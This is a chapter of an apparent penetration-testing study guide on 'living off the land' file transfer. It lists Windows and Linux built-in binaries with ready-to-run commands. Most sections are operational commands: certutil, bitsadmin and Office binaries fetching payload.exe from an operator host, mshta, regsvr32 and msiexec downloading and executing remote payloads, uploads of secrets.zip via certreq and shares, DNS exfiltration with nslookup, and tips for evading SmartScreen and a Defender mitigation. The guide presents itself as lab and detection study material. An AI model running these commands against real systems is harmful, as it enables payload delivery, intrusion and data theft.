# 09 - LOLBins (Living off the Land)

> [← README](../../README.md) · [Next section →](10-encoding.md)

Moving files with built-in system binaries - for when `wget`/`curl`/`powershell` are missing or unavailable in a given environment. "Living off the land": use what the OS already has installed by default.

> **What this material is for.** A study reference for CPTS/CTF and lab work. Every technique is catalogued in public databases (LOLBAS/GTFOBins) and mapped to MITRE ATT&CK (T1105 Ingress Tool Transfer). Red teams use them inside an authorized scope, blue teams use them to build detection rules and understand telemetry.

> **Full technique catalogues (continuously updated):**
> - **LOLBAS** (Windows) - https://lolbas-project.github.io/ (filters `/functions/download`, `/functions/upload`)
> - **GTFOBins** (Unix/Linux) - https://gtfobins.github.io/ (filters `#file-download`, `#file-upload`)
> - **LOLDrivers** (vulnerable drivers) - https://www.loldrivers.io/
> - **Filesec / LOLBins lists** - https://filesec.io/

> **Covered elsewhere:** `certutil`/`bitsadmin`/`curl` - [01](01-attacker-to-target.md)/[02](02-target-to-attacker.md), FTP - [05-ftp.md](05-ftp.md), SCP/SFTP - [06-scp-sftp-rsync.md](06-scp-sftp-rsync.md), Netcat - [07-netcat.md](07-netcat.md), DNS/ICMP - [12-dns-icmp.md](12-dns-icmp.md).

> **Important:** some methods depend on the Windows/Office/Visual Studio version and may be patched or blocked by policy. Test them in your own lab and check against LOLBAS; binary paths can differ too.

> **SSH accounts:** the OpenSSL/SSH examples use `LHOST_user` / `RHOST_user` for the SSH logins on LHOST/RHOST. Set them before use: `export LHOST_user=user RHOST_user=user` (see [README variables](../../README.md#notation-and-variables)).

---

## Navigation

|  |  |
|---|---|
| [Quick pick](#quick-pick) | [Quick reference: binary → path](#quick-reference-binary--path) |
| [1.🪟Windows - download by URL (HTTP/HTTPS)](#1windows---download-by-url-httphttps) | [2.🪟Windows - copying from a UNC share (SMB/WebDAV)](#2windows---copying-from-a-unc-share-smbwebdav) |
| [3.🪟Windows - upload / exfil](#3windows---upload--exfil) | [4.🪟Windows - exotic](#4windows---exotic) |
| [5.🐧Linux / Unix - alternatives](#5linux--unix---alternatives) | [6. openssl s_server / s_client (transfer over TLS)](#6-openssl-s_server--s_client-transfer-over-tls) |
| [7. Notes](#7-notes) |  |

---

## Quick pick

| What you need | What to use |
|---|---|
| URL → file on disk | `certutil`, `MpCmdRun`, `bitsadmin`, `certoc`, `msedge_proxy`, `curl.exe` |
| URL → cache/INetCache | `InstallUtil`, `Ngen`, `Presentationhost`, `Xwizard`, `msoxmled`, `Scrobj.dll`, `PhotoViewer.dll` |
| UNC/SMB → local | `esentutl`, `extrac32`, `expand`, `replace`, `makecab`, `diantz` |
| Local → remote | `ConfigSecurityPolicy`, `CertReq -Post`, `DataSvcUtil`, `type > \\host\share` |
| Download and execute | `mshta`, `regsvr32`, `msiexec`, `rundll32 url.dll`, `HH.exe`, `ieexec`, `Update.exe` |
| Exfil over DNS | `TestWindowRemoteAgent`, `nslookup` |
| Linux without wget/curl | `busybox wget`, `lynx`, `GET`, `socat`, `tftp`, `whois`, `ssh` |

> `INetCache` is usually `%LOCALAPPDATA%\Microsoft\Windows\INetCache\`; if it says it downloaded but the file is nowhere to be found, look there.

---

## Quick reference: binary → path

| Binary | Where it lives (typical path) |
|--------|--------------------------|
| `bitsadmin` | `C:\Windows\System32\bitsadmin.exe` |
| `certutil` | `C:\Windows\System32\certutil.exe` |
| `certoc` | `C:\Windows\System32\certoc.exe` |
| `mshta` | `C:\Windows\System32\mshta.exe` |
| `msiexec` | `C:\Windows\System32\msiexec.exe` |
| `regsvr32` | `C:\Windows\System32\regsvr32.exe` |
| `rundll32` | `C:\Windows\System32\rundll32.exe` |
| `url.dll` | `C:\Windows\System32\url.dll` |
| `MpCmdRun` | `C:\ProgramData\Microsoft\Windows Defender\Platform\<version>\MpCmdRun.exe` |
| `ieexec` | `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe` |
| `InstallUtil` | `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe` |
| `ngen` | `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngen.exe` |
| `Presentationhost` | `C:\Windows\System32\Presentationhost.exe` |
| `xwizard` | `C:\Windows\System32\xwizard.exe` |
| `msedge` | `C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe` |
| `msedge_proxy` | `C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe` |
| `VSLaunchBrowser` | `C:\Program Files\Microsoft Visual Studio\<version>\...\VSLaunchBrowser.exe` |
| `hh` | `C:\Windows\hh.exe` |
| `msoxmled` | `C:\Program Files\Microsoft Office\root\vfs\...\msoxmled.exe` |
| `ProtocolHandler` | `C:\Program Files\Microsoft Office\Office16\ProtocolHandler.exe` |
| `scrobj.dll` | `C:\Windows\System32\scrobj.dll` |
| `PhotoViewer.dll` | `C:\Program Files\Windows Photo Viewer\PhotoViewer.dll` |
| `shimgvw.dll` | `C:\Windows\System32\shimgvw.dll` |
| `Update.exe` / `Squirrel.exe` | `%LOCALAPPDATA%\<app>\Update.exe` (e.g. `...\Microsoft\Teams\update.exe`) |
| Office (`Excel`/`winword`/…) | `C:\Program Files\Microsoft Office\Office16\` |
| `xsd` | `C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\bin\...\xsd.exe` |
| `cmd` | `C:\Windows\System32\cmd.exe` |
| `esentutl` | `C:\Windows\System32\esentutl.exe` |
| `expand` | `C:\Windows\System32\Expand.exe` |
| `extrac32` | `C:\Windows\System32\extrac32.exe` |
| `findstr` | `C:\Windows\System32\findstr.exe` |
| `makecab` | `C:\Windows\System32\makecab.exe` |
| `diantz` | `C:\Windows\System32\diantz.exe` |
| `replace` | `C:\Windows\System32\replace.exe` |
| `print` | `C:\Windows\System32\print.exe` |
| `PrintBrm` | `C:\Windows\System32\spool\tools\PrintBrm.exe` |
| `ldifde` | `C:\Windows\System32\ldifde.exe` |
| `ConfigSecurityPolicy` | `C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe` |
| `certreq` | `C:\Windows\System32\certreq.exe` |
| `DataSvcUtil` | `C:\Windows\Microsoft.NET\Framework64\v3.5\DataSvcUtil.exe` |
| `TestWindowRemoteAgent` | `...\Common7\IDE\CommonExtensions\Microsoft\TestWindow\RemoteAgent\TestWindowRemoteAgent.exe` |
| `wsl` | `C:\Windows\System32\wsl.exe` |
| `winget` | `%LOCALAPPDATA%\Microsoft\WindowsApps\winget.exe` |
| `devtunnel` | `%LOCALAPPDATA%\Temp\DevTunnels\devtunnel.exe` |
| `finger` | `C:\Windows\System32\finger.exe` |
| `nslookup` | `C:\Windows\System32\nslookup.exe` |
| `IMEWDBLD` | `C:\Windows\System32\IME\SHARED\IMEWDBLD.exe` |
| `AppInstaller` | `C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_<version>_...\AppInstaller.exe` |
| `desktopimgdownldr` | `C:\Windows\System32\desktopimgdownldr.exe` |
| `OneDriveStandaloneUpdater` | `C:\Program Files\Microsoft OneDrive\OneDriveStandaloneUpdater.exe` |
| `bcp` | `C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\<version>\Tools\Binn\bcp.exe` |

> **Finding the path on the target itself:**
> ```cmd
> where certutil
> ```
> ```powershell
> Get-Command certutil | Select-Object -ExpandProperty Source
> ```
>
> **32/64-bit:** 64-bit binaries live in `C:\Windows\System32`, 32-bit ones in `C:\Windows\SysWOW64` (yes, the other way round - that's the WOW64 redirect). If there's no `System32` variant, try `SysWOW64`.

---

## 1.🪟Windows - download by URL (HTTP/HTTPS)

> Ready-made tester: [`scripts/Windows-download-test.ps1`](../../scripts/Windows-download-test.ps1) - `-LOLBINS -All` runs the safe LOLBin matrix. `-Danger` runs **only** danger-tagged methods (desktopimgdownldr, certutil `-URL`, CertOC, ConfigSecurityPolicy, xsd, IMEWDBLD) - lab-only; combine `-Danger -LOLBINS` to include both sets. `-UNCPath '\\host\share\file'` enables the UNC section.

### Bitsadmin / BITS

> **Path:** `C:\Windows\System32\bitsadmin.exe`

**BITS** (Background Intelligent Transfer Service) is the Windows service for background downloads. `bitsadmin.exe` only creates the job; the transfer itself is done by the `BITS` service, so the network connections come from `svchost.exe`, not from `bitsadmin.exe`.

**Check the service:**
```cmd
sc query bits
:: if STOPPED:
net start bits
```

```powershell
Get-Service BITS
```

**Simple download (waits for completion and shows progress):**
```cmd
bitsadmin /transfer myjob /download /priority normal http://%LHOST%/payload.exe C:\Users\Public\payload.exe
```

> **`0x80200013` / `BG_E_INSUFFICIENT_RANGE_SUPPORT`** means the server ignored a Range request and returned the whole file (`200`). `python3 -m http.server` and `php -S` do that. `Accept-Ranges` is only a hint: `updog`/Werkzeug can return `206` without it. Check with a Range probe, add `/dynamic` (`bitsadmin`) or `-Dynamic` (`Start-BitsTransfer`), or serve with `busybox`/`ruby`/`nginx`/`updog`.

- `/priority`: `foreground`, `high`, `normal`, `low`.
- `foreground` - the highest priority, useful when the job is "stuck in the queue".
- If the file already exists, BITS may return an error - delete it first.
- The destination folder must exist; quote paths that contain spaces.
- If the server doesn't support range/resume (for example `python3 -m http.server`), add `/dynamic`:
```cmd
bitsadmin /transfer myjob /download /priority normal /dynamic http://%LHOST%/payload.exe C:\Users\Public\payload.exe
```

**Managing the job by hand (when `/transfer` hangs somewhere unclear):**
```cmd
bitsadmin /create myjob
bitsadmin /addfile myjob http://%LHOST%/payload.exe C:\Users\Public\payload.exe
bitsadmin /setpriority myjob high
bitsadmin /resume myjob
```

**Watching the state:**
```cmd
bitsadmin /list
bitsadmin /list /allusers        # requires admin
bitsadmin /info myjob /verbose
bitsadmin /getstate myjob
bitsadmin /monitor
```

**Finish/delete:**
```cmd
bitsadmin /complete myjob
bitsadmin /cancel myjob
bitsadmin /reset
```

> `/complete` is required for a manual job: after `TRANSFERRED` the file may not be "committed" yet. `/reset` cancels **all** jobs of the current user; `/reset /allusers` cancels everyone's jobs and requires admin. `Ctrl+C` on `bitsadmin /transfer` only stops the progress output - the job may still be queued, check with `/list`.

**Job states:**

| State | What it means |
|---|---|
| `CONNECTING` | connecting |
| `TRANSFERRING` | transferring |
| `TRANSFERRED` | downloaded; a manual job still needs `/complete` |
| `SUSPENDED` | suspended |
| `TRANSIENT_ERROR` | temporary error, BITS retries |
| `ERROR` | fatal error |
| `CANCELLED` | cancelled |

**Direct upload via BITS - an important nuance:**
```cmd
bitsadmin /transfer uploadjob /upload /priority normal http://%LHOST%/upload C:\Users\Public\secrets.zip
```

This is **not** a regular HTTP POST. `/upload` needs a BITS-compatible server (IIS BITS Upload, BITSServer, etc.). Against `python -m http.server`, `uploadserver`, `serv.py` or an nginx PUT endpoint BITS upload usually does not work - it expects its own protocol. For exfil to your own receiver, use `certreq`, `curl`, `ConfigSecurityPolicy` or `type > \\host\share`.

**PowerShell variant:**
```powershell
Start-BitsTransfer -Source "http://${LHOST}/payload.exe" -Destination "C:\Users\Public\payload.exe" -Priority Normal

# via the system proxy
Start-BitsTransfer -Source "http://${LHOST}/payload.exe" -Destination "C:\Users\Public\payload.exe" -ProxyUsage SystemDefault

# asynchronous
$job = Start-BitsTransfer -Source "http://${LHOST}/payload.exe" -Destination "C:\Users\Public\payload.exe" -Asynchronous
Get-BitsTransfer -JobId $job.JobId
Complete-BitsTransfer -BitsJob $job
```

**Upload via PowerShell** (also needs a BITS server):
```powershell
Start-BitsTransfer -TransferType Upload -Source "C:\Users\Public\secrets.zip" -Destination "http://${LHOST}/upload"
```

**Common errors:**

| Code/symptom | Cause | Fix |
|---|---|---|
| `0x80070422` | BITS service disabled | `net start bits`, check policy |
| `0x80072EE7` | name/proxy not resolving | check DNS, `nslookup`, proxy |
| `0x80072EFD` | can't connect | firewall/port/URL |
| `0x80190194` | HTTP 404 | check the path on the server |
| `0x80070005` | access denied | permissions on the destination folder |
| `0x80070050` | file already exists | delete the file or use another name |
| `0x80072F8F` | TLS/certificate | HTTP or a trusted cert; BITS often dislikes self-signed |
| `TRANSFERRED` but no file | manual job not completed | `bitsadmin /complete myjob` |
| job stuck in `TRANSFERRING` | proxy/auth/server | `bitsadmin /info myjob /verbose`, then `/cancel`, `/reset` |

> BITS jobs live in the user's queue and can survive a reboot. Clean up afterwards: `bitsadmin /reset` or `Get-BitsTransfer | Remove-BitsTransfer`.

> For defenders: BITS is visible in the service logs, and the network traffic comes from `svchost.exe`, not from `bitsadmin.exe`. So monitoring the `bitsadmin.exe` process alone is not enough.

### Certutil (3 variants)

> **Path:** `C:\Windows\System32\certutil.exe`

**The classic - into `C:\Users\Public`:**
```cmd
certutil.exe -urlcache -f http://%LHOST%/payload.exe C:\Users\Public\payload.exe
```

**Large file / unstable link:**
```cmd
certutil.exe -urlcache -split -f http://%LHOST%/payload.exe C:\Users\Public\payload.exe
```

**`-verifyctl` - into `C:\Users\Public` (or into CryptnetUrlCache if no path is given):**
```cmd
certutil.exe -verifyctl -f http://%LHOST%/payload.exe C:\Users\Public\payload.exe
```

> `-verifyctl` is CTL-oriented. On some Windows Server builds it downloads the file but then fails with `DecodeFile ... file not found` for arbitrary binaries. Use `-urlcache` in that case.

**`-URL` - drops it into `%LOCALAPPDATA%\Microsoft\CryptnetUrlCache\Content\<hash>`:**
```cmd
certutil.exe -URL http://%LHOST%/payload.exe
```

### MpCmdRun (Defender)

> **Path:** `C:\ProgramData\Microsoft\Windows Defender\Platform\<version>\MpCmdRun.exe` (or `C:\Program Files\Windows Defender\MpCmdRun.exe`)

**Direct download:**
```cmd
MpCmdRun.exe -DownloadFile -url http://%LHOST%/payload.exe -path C:\Users\Public\payload.exe
```

> `-DownloadFile` requires a Defender platform version that supports it. On older Defender platform versions the option is absent (seen on Server 2019/2022 with an old platform); the tester reports `mpcmdrun` as SKIP.

**Copy the binary out of the platform folder and run it (bypasses the Win10 mitigation):**
```cmd
copy "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" C:\Users\Public\MP.exe
chdir "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\"
C:\Users\Public\MP.exe -DownloadFile -url http://%LHOST%/payload.exe -path C:\Users\Public\payload.exe
```

### CertOC

> **Path:** `C:\Windows\System32\certoc.exe`

**Downloads text files (scripts, web shells):**
```cmd
certoc.exe -GetCACAPS http://%LHOST%/file.ps1
```

### Ieexec

> **Path:** `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe`

**Downloads and runs a .NET executable:**
```cmd
ieexec.exe http://%LHOST%/payload.exe
```

### Installutil

> **Path:** `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe`

**Drops the payload into INetCache:**
```cmd
InstallUtil.exe http://%LHOST%/payload.exe
```

### Ngen

> **Path:** `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngen.exe`

**Drops the payload into INetCache:**
```cmd
ngen.exe http://%LHOST%/payload.exe
```

### Presentationhost

> **Path:** `C:\Windows\System32\Presentationhost.exe`

**Drops the payload into INetCache:**
```cmd
Presentationhost.exe http://%LHOST%/payload.exe
```

### Xwizard

> **Path:** `C:\Windows\System32\xwizard.exe`

**The RemoteApp wizard downloads the file into INetCache:**
```cmd
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttp://%LHOST%/payload.exe
```

### msedge

> **Path:** `C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe`

**Opens the URL and downloads the file (add a harmless extension to get past SmartScreen):**
```cmd
msedge.exe http://%LHOST%/payload.exe.txt
```

**Headless - quietly dumps the content into a file (prefer base64 for data):**
```cmd
msedge.exe --headless --enable-logging --disable-gpu --dump-dom "http://%LHOST%/file.b64.html" > file.b64
```

### msedge_proxy

> **Path:** `C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe`

**Downloads a file:**
```cmd
"C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe" http://%LHOST%/file.zip
```

### VSLaunchBrowser

> **Path:** `C:\Program Files\Microsoft Visual Studio\<version>\Community\Common7\IDE\VSLaunchBrowser.exe`

**Downloads into INetCache and opens it with the associated application:**
```cmd
VSLaunchBrowser.exe .exe http://%LHOST%/payload.exe
```

### Hh (HTML Help)

> **Path:** `C:\Windows\hh.exe`

**Opens a remote file through HTML Help:**
```cmd
HH.exe http://%LHOST%/file.bat
```

### msoxmled

> **Path:** `C:\Program Files\Microsoft Office\root\vfs\ProgramFilesCommonX64\Microsoft Shared\Office16\msoxmled.exe`

**Microsoft Office XML Editor - pulls the file into INetCache:**
```cmd
msoxmled.exe /verb open http://%LHOST%/payload.exe
```

### ProtocolHandler

> **Path:** `C:\Program Files\Microsoft Office\Office16\ProtocolHandler.exe`

**Opens the URL in the default browser (the file often lands in Downloads):**
```cmd
ProtocolHandler.exe http://%LHOST%/payload.exe
```

### Rundll32 + url.dll

> **Path:** `C:\Windows\System32\rundll32.exe`, `C:\Windows\System32\url.dll`

**Opens the URL through the protocol handler; the file usually lands in Downloads/INetCache:**
```cmd
rundll32.exe url.dll,FileProtocolHandler http://%LHOST%/payload.exe
```

### Scrobj.dll via rundll32

> **Path:** `C:\Windows\System32\scrobj.dll`

**Downloads the file into INetCache:**
```cmd
rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib http://%LHOST%/payload.exe
```

### PhotoViewer.dll via rundll32

> **Path:** `C:\Program Files\Windows Photo Viewer\PhotoViewer.dll`

**Downloads the file into INetCache:**
```cmd
rundll32.exe "C:\Program Files\Windows Photo Viewer\PhotoViewer.dll",ImageView_Fullscreen http://%LHOST%/payload.exe
```

### Shimgvw.dll via rundll32

> **Path:** `C:\Windows\System32\shimgvw.dll`

**Downloads the file into INetCache:**
```cmd
rundll32.exe C:\Windows\System32\shimgvw.dll,ImageView_Fullscreen http://%LHOST%/payload.exe
```

### Update.exe / Squirrel.exe

> **Path:** `%LOCALAPPDATA%\Microsoft\Teams\update.exe` / `%LOCALAPPDATA%\Discord\Update.exe` (every Electron app has its own)

**The updater of Electron apps (Teams, Discord, Slack, GitHub Desktop…) pulls a package from a URL:**
```cmd
%LOCALAPPDATA%\Discord\Update.exe --download http://%LHOST%/
```

```cmd
squirrel.exe --download http://%LHOST%/
```

### Office applications

> **Path:** `C:\Program Files\Microsoft Office\Office16\` (Excel.exe, winword.exe, Powerpnt.exe, Outlook.exe, MSAccess.exe, Mspub.exe, MSOHTMED.exe)

**Excel:**
```cmd
Excel.exe http://%LHOST%/payload.exe
```

**Word:**
```cmd
winword.exe http://%LHOST%/payload.exe
```

**PowerPoint:**
```cmd
Powerpnt.exe http://%LHOST%/payload.exe
```

**Outlook:**
```cmd
Outlook.exe http://%LHOST%/payload.exe
```

### xsd

> **Path:** `C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\bin\NETFX <version> Tools\xsd.exe`

**Drops the payload into INetCache:**
```cmd
xsd.exe http://%LHOST%/payload.exe
```

---

## 2.🪟Windows - copying from a UNC share (SMB/WebDAV)

> You need a share on the operator side: SMB - [03-smb.md](03-smb.md), WebDAV - [04-webdav.md](04-webdav.md). The path looks like `\\LHOST\share\file`.
>
> **Authenticate before the UNC tests.** For an authenticated share run `net use \\LHOST\share /user:test test`; without it the copy methods fail with `Path not found` / `Cannot open file`.
>
> The tester's `-UNCPath '\\LHOST\share\payload.exe'` expects this share. Example on LHOST: `sudo impacket-smbserver share /tmp/share -smb2support -username test -password test`.
>
> `esentutl` can fail with `JET_errDiskIO` on some SMB shares/Server builds even after `net use`; `extrac32` and `replace` are more reliable there.

### Cmd (`type` + redirect)

> **Path:** `C:\Windows\System32\cmd.exe`

**Download from the share to a local file:**
```cmd
type \\%LHOST%\share\payload.exe > C:\Users\Public\payload.exe
```

**Upload a local file to the share:**
```cmd
type C:\Users\Public\payload.exe > \\%LHOST%\share\payload.exe
```

### Esentutl

> **Path:** `C:\Windows\System32\esentutl.exe`

**Copies a file from a UNC path to the local disk:**
```cmd
esentutl.exe /y \\%LHOST%\share\payload.exe /d C:\Users\Public\payload.exe /o
```

> `net use` is required for an authenticated share. Even then, `esentutl` can fail with `JET_errDiskIO` on some SMB shares/Server builds; `extrac32` and `replace` are more reliable there.

### Expand

> **Path:** `C:\Windows\System32\Expand.exe`

**Copies a file (usually .cab) from the share:**
```cmd
expand \\%LHOST%\share\file.cab C:\Users\Public\payload.exe
```

### Extrac32

> **Path:** `C:\Windows\System32\extrac32.exe`

**Copies a file from the share:**
```cmd
extrac32 /Y /C \\%LHOST%\share\payload.exe C:\Users\Public\payload.exe
```

**Into an alternate data stream (ADS) - a T1564.004 demonstration:**
```cmd
extrac32 /Y /C \\%LHOST%\share\payload.exe "C:\Users\Public\host.txt:payload.exe"
```

### Findstr

> **Path:** `C:\Windows\System32\findstr.exe`

**`/V /L` with a string that certainly isn't there prints the whole file (text!):**
```cmd
findstr /V /L W3AllLov3LolBas \\%LHOST%\share\file.txt > C:\Users\Public\file.txt
```

> Not suitable for binaries - `findstr` works line by line and can corrupt the data.

### Makecab

> **Path:** `C:\Windows\System32\makecab.exe`

**Pulls a file from the share and packs it into a .cab straight away:**
```cmd
makecab \\%LHOST%\share\payload.exe C:\Users\Public\file.cab
```

### Diantz

> **Path:** `C:\Windows\System32\diantz.exe`

**The same thing via `diantz` (then `expand`):**
```cmd
diantz.exe \\%LHOST%\share\payload.exe C:\Users\Public\file.cab
```

```cmd
expand C:\Users\Public\file.cab -F:* C:\Users\Public\
```

### Replace

> **Path:** `C:\Windows\System32\replace.exe`

**The stock "file replacement" tool copies from the share:**
```cmd
replace.exe \\%LHOST%\share\payload.exe C:\Temp /A
```

### Print

> **Path:** `C:\Windows\System32\print.exe`

**Copies a file from the share to disk (through the print spooler; check binaries):**
```cmd
print /D:C:\Users\Public\file.txt \\%LHOST%\share\file.txt
```

### PrintBrm

> **Path:** `C:\Windows\System32\spool\tools\PrintBrm.exe`

**Collects the contents of a remote folder into a zip:**
```cmd
PrintBrm -b -d \\%LHOST%\share\loot -f C:\Users\Public\secrets.zip
```

### Ldifde

> **Path:** `C:\Windows\System32\ldifde.exe`

**Imports an .ldf; if an attribute contains an `http://` link, the file gets downloaded into the IE temp folder:**
```cmd
Ldifde -i -f C:\Users\Public\file.ldf
```

---

## 3.🪟Windows - upload / exfil

### ConfigSecurityPolicy (Defender)

> **Path:** `C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe` (or `C:\ProgramData\Microsoft\Windows Defender\Platform\<version>\ConfigSecurityPolicy.exe`)

**Upload: local file first, then the URL (the order matters!):**
```cmd
ConfigSecurityPolicy.exe C:\Users\Public\sample.txt http://%LHOST%/
```

**The download variant (URL without a file) puts the response into INetCache:**
```cmd
ConfigSecurityPolicy.exe http://%LHOST%/payload.exe
```

### CertReq

> **Path:** `C:\Windows\System32\certreq.exe`

**Upload - POST the file to the operator's receiver:**
```cmd
certreq.exe -Post -config http://%LHOST%/ C:\Users\Public\sample.txt
```

**Download - save the server response to a file:**
```cmd
certreq.exe -Post -config http://%LHOST%/ C:\Users\Public\sample.txt C:\Users\Public\resp.txt
```

### DataSvcUtil

> **Path:** `C:\Windows\Microsoft.NET\Framework64\v3.5\DataSvcUtil.exe`

**Upload/exfil: the local file goes in `/out:`, the receiver URL in `/uri:`**
```cmd
DataSvcUtil /out:C:\Users\Public\sample.txt /uri:http://%LHOST%/
```

### TestWindowRemoteAgent

> **Path:** `C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\CommonExtensions\Microsoft\TestWindow\RemoteAgent\TestWindowRemoteAgent.exe`

**Exfil over DNS: data (hex/base32) leaves in a subdomain of your domain:**
```cmd
set DATA=48656c6c6f
TestWindowRemoteAgent.exe start -h %DATA%.%DOMAIN% -p 8000
```

### Cmd (`type` + redirect)

> **Path:** `C:\Windows\System32\cmd.exe`

**Upload to a WebDAV share:**
```cmd
type C:\Users\Public\secrets.zip > \\%LHOST%\share\secrets.zip
```

---

## 4.🪟Windows - exotic

### Mshta

> **Path:** `C:\Windows\System32\mshta.exe`

**Downloads and executes a remote HTA:**
```cmd
mshta.exe http://%LHOST%/payload.hta
```

### Regsvr32 (remote SCT)

> **Path:** `C:\Windows\System32\regsvr32.exe`

**Downloads and executes a scriptlet through `scrobj.dll`:**
```cmd
regsvr32.exe /s /n /u /i:http://%LHOST%/payload.sct scrobj.dll
```

### Msiexec

> **Path:** `C:\Windows\System32\msiexec.exe`

**Downloads and installs an MSI:**
```cmd
msiexec.exe /q /i http://%LHOST%/payload.msi
```

### Wsl

> **Path:** `C:\Windows\System32\wsl.exe`

**WSL as a downloader - bash inside WSL fetches over `/dev/tcp` (raw TCP, not HTTP):**
```cmd
:: LHOST: nc -lvnp 9000 < payload.exe
wsl.exe --exec bash -c "cat < /dev/tcp/%LHOST%/9000 > /tmp/binary"
```

### winget

> **Path:** `%LOCALAPPDATA%\Microsoft\WindowsApps\winget.exe`

**Installs software from the Microsoft Store even when the Store is blocked (e.g. Sysinternals Suite):**
```cmd
winget.exe install --accept-package-agreements -s msstore "Sysinternals Suite"
```

### devtunnel

> **Path:** `%LOCALAPPDATA%\Temp\DevTunnels\devtunnel.exe`

**Exposes a local service on the target to the outside (port expose):**
```cmd
devtunnel.exe host -p 8080
```

### Finger

> **Path:** `C:\Windows\System32\finger.exe`

**Transfer over the finger protocol (port 79, text/short strings only). Needs a finger server on LHOST:**
```cmd
finger user@%LHOST% | more +2 > file.txt
```

### Nslookup

> **Path:** `C:\Windows\System32\nslookup.exe`

**When DNS (port 53) is the only way out - data goes in the query name, and the response can be used for confirmation:**
```cmd
set CHUNK=TVqQAAMAAAAEAAAA
nslookup %CHUNK%.transfer.%DOMAIN% %LHOST%
```

> For exfil, data is encoded into the subdomain (base32/hex), and on LHOST you collect the queries from the DNS log. A TXT response is a separate downlink, not a replacement for this.

### Imewdbld

> **Path:** `C:\Windows\System32\IME\SHARED\IMEWDBLD.exe`

**IME dictionary HTTP downloader - downloads into `%TEMP%` (random name):**
```cmd
C:\Windows\System32\IME\SHARED\IMEWDBLD.exe http://%LHOST%/payload.exe
```

### AppInstaller (ms-appinstaller)

> **Path:** `C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_<version>_x64__8wekyb3d8bbwe\AppInstaller.exe`

**Download via the URI scheme into the App Installer's INetCache:**
```cmd
start ms-appinstaller://?source=http://%LHOST%/file.txt
```

It lands in: `%LOCALAPPDATA%\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\AC\INetCache\`

### Desktopimgdownldr

> **Path:** `C:\Windows\System32\desktopimgdownldr.exe`

**Lock screen wallpaper downloader (changing `SYSTEMROOT` changes the directory):**
```cmd
set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:http://%LHOST%/payload.exe /eventName:foo
```

> **Not destructive, but it changes state.** It writes `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP` (`LockScreenImageUrl`, `LockScreenImagePath`, `LockScreenImageStatus`) and sets the downloaded file as the lockscreen. Restore the previous lockscreen or remove those values afterwards. The tester runs it with a temporary `SYSTEMROOT` and moves the file out, but the registry change remains - `-Danger` only, excluded from `-All`.

### OneDriveStandaloneUpdater

> **Path:** `C:\Program Files\Microsoft OneDrive\OneDriveStandaloneUpdater.exe`

**Downloads a file by URL from the registry value `HKCU\Software\Microsoft\OneDrive\UpdateOfficeConfig\UpdateRingSettingURLFromOC`:**
```cmd
OneDriveStandaloneUpdater
```

> Nuance: `ODSUUpdateXMLUrlFromOC` and `UpdateXMLUrlFromOC` must be non-empty, and `UpdateOfficeConfigTimestamp` should be a large QWORD (e.g. `99999999999`). The file lands in `%LOCALAPPDATA%\OneDrive\StandaloneUpdater\PreSignInSettingsConfig.json`.

### Bcp

> **Path:** `C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\<version>\Tools\Binn\bcp.exe`

**Dump from a database to a file (when you have SQL access):**
```cmd
bcp "SELECT payload_data FROM database.dbo.payloads WHERE id=1" queryout "C:\Windows\Temp\payload.exe" -S localhost -T -c
```

---

## 5.🐧Linux / Unix - alternatives

> On Linux, find the path with `command -v <binary>` (usually `/usr/bin/<binary>`).

### Busybox wget

> **Path:** `/usr/bin/busybox` (or `/bin/busybox`)

**A stripped-down wget - often the only downloader on embedded systems/containers:**
```bash
busybox wget http://$LHOST/payload.sh -O /tmp/payload.sh
```

### Lynx

> **Path:** `/usr/bin/lynx`

**Text browser: `-source` prints the page body to stdout (fine for text files/scripts):**
```bash
lynx -source http://$LHOST/payload.sh > payload.sh
```

### Fetch (BSD)

> **Path:** `/usr/bin/fetch`

**The stock downloader on FreeBSD/pfSense/OPNsense:**
```bash
fetch http://$LHOST/payload.sh
```

### aria2c

> **Path:** `/usr/bin/aria2c`

**A heavy-duty downloader (HTTP/FTP, resume, multi-connection):**
```bash
aria2c -o payload.sh http://$LHOST/payload.sh
```

### axel

> **Path:** `/usr/bin/axel`

**Fast multi-connection downloader:**
```bash
axel -o payload.sh http://$LHOST/payload.sh
```

### Perl LWP (`GET` / `lwp-request`)

> **Path:** `/usr/bin/GET` (`libwww-perl` package)

**A simple downloader from the Perl LWP package:**
```bash
GET http://$LHOST/payload.sh > payload.sh
```

### git

> **Path:** `/usr/bin/git`

**Download a repository (or `git archive` for a subdirectory):**
```bash
git clone https://github.com/user/tools.git /tmp/tools
```

### gawk (via /dev/tcp)

> **Path:** `/usr/bin/gawk`

**When there's neither wget/curl nor python, but `gawk` is present - fetch over HTTP (text only; base64 is better for binaries):**
```bash
gawk -v h="$LHOST" 'BEGIN{
  cmd="bash -c '\''exec 3<>/dev/tcp/"h"/80; printf \"GET /file.bin HTTP/1.0\\r\\nHost: "h"\\r\\n\\r\\n\" >&3; cat <&3'\''"
  while((cmd | getline line) > 0) print line > "/tmp/file.bin"
  close(cmd)
}'
```

